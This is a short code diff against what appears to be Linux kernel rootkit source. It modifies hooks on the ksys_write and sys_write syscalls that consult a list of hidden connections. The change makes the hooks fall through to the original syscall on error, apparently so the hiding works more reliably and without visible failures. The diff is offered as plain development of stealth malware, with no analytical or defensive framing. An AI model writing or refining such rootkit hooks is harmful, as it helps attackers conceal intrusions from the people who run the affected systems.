@@ -390,12 +390,12 @@ static ssize_t khook_ksys_write( unsigned  int fd,  const char __user *buf,  siz
 	int xret;
 
     if (buf == NULL){
-		return nbytes;
+		return KHOOK_ORIGIN(ksys_write, fd, buf, nbytes);
 	}
 
     xret = copy_from_user(tmp, buf, nbytes);
     if (tmp == NULL){
-		return -1;
+		return KHOOK_ORIGIN(ksys_write, fd, buf, nbytes);
 	}
 	
 	list_for_each_entry(hc, &hidden_conn_list, list)
@@ -434,12 +434,12 @@ static ssize_t khook_sys_write( unsigned  int fd,  const char __user *buf,  size
 	int xret;
 
     if (buf == NULL){
-		return nbytes;
+		return KHOOK_ORIGIN(sys_write, fd, buf, nbytes);
 	}
 
     xret = copy_from_user(tmp, buf, nbytes);
     if (tmp == NULL){
-		return -1;
+		return KHOOK_ORIGIN(sys_write, fd, buf, nbytes);
 	}
 	
 	list_for_each_entry(hc, &hidden_conn_list, list)
